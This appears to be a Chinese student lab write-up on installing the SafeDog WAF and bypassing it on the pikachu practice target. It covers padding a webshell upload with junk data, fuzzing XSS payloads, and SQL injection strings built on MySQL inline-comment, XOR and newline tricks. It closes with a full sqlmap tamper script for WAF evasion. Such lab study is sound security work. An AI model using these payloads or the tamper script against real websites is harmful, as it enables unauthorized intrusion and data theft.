---
title: "安全狗WAF部署与多种绕过技术实战"
published: 2025-01-01
description: "安全狗WAF的部署配置以及文件上传脏数据绕过、XSS模糊测试绕过、SQL注入内联注释/异或/换行绕过等多种WAF绕过技术实战。"
tags: ["安全狗", "WAF绕过", "文件上传", "XSS", "SQL注入", "Sqlmap", "Web安全"]
category: "大三下实训"
---

安全狗的部署和绕过

部署安全狗

在安装安全狗前，需要确保win7启动了apache服务

![图片](./images/jr4_safedog_img1.png)

遇到服务名检测不到的情况，先关闭，继续后续的流程

![图片](./images/jr4_safedog_img2.png)

安装完成后，取消勾选安装服务器安全狗

![图片](./images/jr4_safedog_img3.png)

通过cmd（管理员权限打开）进入apache服务的bin目录下，执行命令

cd C:\phpstudy_pro\Extensions\Apache2.4.39\bin

httpd.exe -k install

httpd.exe -k start

![图片](./images/jr4_safedog_img4.png)

执行完成后，重新找到安装插件的位置，发现已经自动识别成功

![图片](./images/jr4_safedog_img5.png)

出现提示安装失败，点击确定，然后把安全狗程序退出，再重启安全狗

![图片](./images/jr4_safedog_img6.png)

重启后，安装完成，进行实验前要先重启phpstudy

![图片](./images/jr4_safedog_img7.png)

修改最大请求数目，这里写大一点，点击保存

![图片](./images/jr4_safedog_img8.png)

绕过安全狗

文件上传

访问pikachu靶场，选择文件上传关卡，禁用JavaScript

![图片](./images/jr4_safedog_img9.png)

当我们使用常规的绕过方式进行文件上传时，会发现被安全狗拦截

![图片](./images/jr4_safedog_img10.png)

![图片](./images/jr4_safedog_img19.png)

绕过方式：

脏数据绕过：超出waf检测的字节数，保证数据包正确，不能打乱原有规则

在上传webshell.php时，抓包，然后在数据包中加入一堆无用的字符串，但要保证数据包正确，不能打乱原有规则

![图片](./images/jr4_safedog_img21.png)

再次发包，发现上传成功，即成功绕过安全狗

![图片](./images/jr4_safedog_img20.png)

XSS绕过

使用原本的payload进行测试，发现被安全狗拦截

![图片](./images/jr4_safedog_img11.png)

绕过方式：

fuzz测试（模糊测试）：使用payload进行暴力破解

![图片](./images/jr4_safedog_img12.png)

爆破完成后，在响应中找到成功绕过的payload，进行复测

![图片](./images/jr4_safedog_img13.png)

![图片](./images/jr4_safedog_img14.png)

成功绕过安全狗

SQL注入

使用name=-1’ and 1=1测试闭合，发现触发拦截

![图片](./images/jr4_safedog_img15.png)

绕过方式：

内联注释绕过

在mysql的语法中，有三种注释方法:--和#(单行注释)和/**/(多行注释)，如果在/*后加惊叹号!意为/**/里的语句将被执行

1、MySQL内联注释： /!xxxxxxx/ !后面的语句会当作SQL语句直接执行

2、当!后面接的数据库版本号小于自身版本号，就会将注释中的内容执行

3、当!后面接的数据库版本号大于等于自身版本号，就会当做注释来处理。

尝试将内联注释构建在payload中

-1' union /*!77777cz*//*!77777cz*/ select database/*!77777a*/(),2#

![图片](./images/jr4_safedog_img16.png)

成功绕过安全狗

异或绕过

在 ^ 没有被过滤的时候可以利用它来测试 异或： Xor 或^ 逻辑运算就是：同假异真（两个条件结果相同就为假，结果不同就为真） 例如：1^0 就是 1 ，1^1 就是 0

alan' Xor '1'='1' --+

#如果‘alan’存在则前后都为真则为返回假

#如果’alan’不存在则前为假后都为真则为返回真

如果A为真，则查出不满足B条件数据; 如果A为假，则查出满足B条件数据；

![图片](./images/jr4_safedog_img17.png)

成功绕过安全狗

换行绕过

换行符绕过

%23%0a

%2d%2d%0a

构造payload：

' %23%0a union select 1,2,3 %23%0a

实际发给mysql的是：

' #

union select 1,2,3 #

![图片](./images/jr4_safedog_img18.png)

发现安全狗没办法用换行绕过

使用sqlmap探测

WAF(含安全狗)主要靠三类手段检测注入：

正则/关键字匹配:UNION SELECT、'or、#、--等

语义/行为分析:请求频率、UA、参数结构

长度/编码特征

sqlmap 的绕过思路是：让 WAF 看到的 payload ≠ 数据库实际执行的语义。并且，sqlmap内置了一些绕过脚本， 使用--tamper 参数调用。脚本文件在 sqlmap/tamper/ 目录，也可以自己写。

# 导入sqlmap优先级枚举类，用于控制tamper脚本的执行顺序

from lib.core.enums import PRIORITY

# 设置本脚本的优先级为LOW（在同类tamper中较晚执行）

__priority__ = PRIORITY.LOW

# 定义tamper函数，payload是原始SQL注入语句，kwargs保留其他参数

def tamper(payload, **kwargs):

# 混淆AND关键字，使用MySQL版本条件注释绕过简单匹配

payload=payload.replace('AND','/*!29440AND*/')

# 混淆ORDER关键字，添加注释并改为小写绕过大小写敏感检测

payload=payload.replace('ORDER','/*!29440order*/')

# 分割USER()函数，用/**/空格绕过函数名连续检测

payload=payload.replace('LIKE USER()','like (user/**/())')

# 混淆DATABASE()函数，插入版本注释破坏函数名结构

payload=payload.replace('DATABASE()','database/*!29440*/()')

# 分割CURRENT_USER()函数，用/**/绕过括号检测

payload=payload.replace('CURRENT_USER()','CURRENT_USER/**/()')

# 在SESSION_USER()中添加换行符%0a，绕过行级规则检测

payload=payload.replace('SESSION_USER()','SESSION_USER(%0a)')

# 混淆UNION ALL SELECT语句，将ALL SELECT合并为注释分割的select

payload=payload.replace('UNION ALL SELECT','union/*!29440select*/')

# 隐藏super_priv列名，用嵌套注释包裹敏感字段

payload=payload.replace('super_priv','/*!29440/**/super_priv*/')

# 分割host=条件语句，用注释伪装等号操作符

payload=payload.replace('and host=','/*!29440and*/host/*!11440=*/')

# 混淆BENCHMARK函数，插入版本注释分割函数名和参数

payload=payload.replace('BENCHMARK(','BENCHMARK/*!29440*/(')

# 分割SLEEP函数，用/**/空格绕过函数名检测

payload=payload.replace('SLEEP(','sleep/**/(')

# 返回修改后的payload

return payload
